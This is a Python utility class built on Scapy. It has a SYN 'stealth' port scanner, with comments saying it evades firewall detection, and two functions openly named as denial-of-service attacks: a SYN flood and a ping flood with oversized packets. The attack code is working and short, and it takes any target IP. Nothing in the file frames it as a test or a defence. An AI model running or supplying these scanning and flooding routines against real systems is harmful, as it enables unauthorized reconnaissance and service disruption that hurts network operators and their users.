from scapy.layers.inet import IP, TCP, ICMP
from scapy.packet import Raw
from scapy.sendrecv import send, sr, sr1
from scapy.volatile import RandShort
from injectable import injectable, autowired, Autowired
from tekleo_common_utils import UtilsRandom


@injectable
class UtilsScapy:
    @autowired
    def __init__(self, utils_random: Autowired(UtilsRandom)):
        self.utils_random = utils_random

    # Scanning
    #-------------------------------------------------------------------------------------------------------------------
    # This utilizes TCP stealth scan
    # https://resources.infosecinstitute.com/topic/port-scanning-using-scapy/
    def _check_port_tcp_stealth_scan(self, target_ip_address: str, target_port: int, timeout: float = 2.0) -> bool:
        # The client sends a TCP packet with the SYN flag set and the port number to connect to
        ip = IP(dst=target_ip_address)
        tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
        stealth_scan_resp = sr1(ip / tcp, timeout=timeout, verbose=0)

        # Port filtered
        if stealth_scan_resp is None:
            pass

        # If the port is open, the server responds with the SYN and ACK flags inside a TCP packet
        elif stealth_scan_resp.haslayer(TCP):
            if stealth_scan_resp.getlayer(TCP).flags == 0x12:
                # But this time the client sends a RST flag in a TCP packet and not RST+ACK, which was the case in the TCP connect scan.
                # This technique is used to avoid port scanning detection by firewalls
                ip = IP(dst=target_ip_address)
                tcp = TCP(sport=RandShort(), dport=target_port, flags="R")
                send_rst_resp = sr(ip / tcp, timeout=timeout, verbose=0)
                return True

            # This indicates that the port is closes
            elif stealth_scan_resp.getlayer(TCP).flags == 0x14:
                return False

        # Port filtered
        elif(stealth_scan_resp.haslayer(ICMP)):
            if int(stealth_scan_resp.getlayer(ICMP).type)==3 and int(stealth_scan_resp.getlayer(ICMP).code) in [1,2,3,9,10,13]:
                pass

        # Default case
        return False

    def check_port(self, target_ip_address: str, target_port: int, timeout: float = 1.0) -> (str, int, bool):
        return target_ip_address, target_port, self._check_port_tcp_stealth_scan(target_ip_address, target_port, timeout=timeout)
    #-------------------------------------------------------------------------------------------------------------------



    # DoS attacks
    #-------------------------------------------------------------------------------------------------------------------
    # A SYN flood attack is a common form of a denial of service attack in which an attacker sends a sequence of SYN requests to the target system
    # https://www.thepythoncode.com/article/syn-flooding-attack-using-scapy-in-python
    def attack_syn_flood(self, target_ip_address: str, target_port: int, number_of_packets_to_send: int = 1024, size_of_packet: int = 1024 * 4, spoof_source_ip: bool = True) -> bool:
        ip = IP(dst=target_ip_address)
        tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
        raw = Raw(b"X" * size_of_packet)
        p = ip / tcp / raw
        send(p, loop=0, count=number_of_packets_to_send, verbose=0)
        print('UtilsScapy.attack_syn_flood(): Sent ' + str(number_of_packets_to_send) + ' packets of ' + str(size_of_packet) + ' size to ' + target_ip_address + ' on port ' + str(target_port))
        return True

    def attack_ping_flood(self, target_ip_address: str, number_of_packets_to_send: int = 3, size_of_packet: int = 65500, spoof_source_ip: bool = True) -> bool:
        ip = IP(dst=target_ip_address)
        icmp = ICMP()
        raw = Raw(b"X" * size_of_packet)
        p = ip / icmp / raw
        send(p, loop=0, count=number_of_packets_to_send, verbose=0)
        print('UtilsScapy.attack_ping_flood(): Sent ' + str(number_of_packets_to_send) + ' pings of ' + str(size_of_packet) + ' size to ' + target_ip_address)
        return True
    #-------------------------------------------------------------------------------------------------------------------
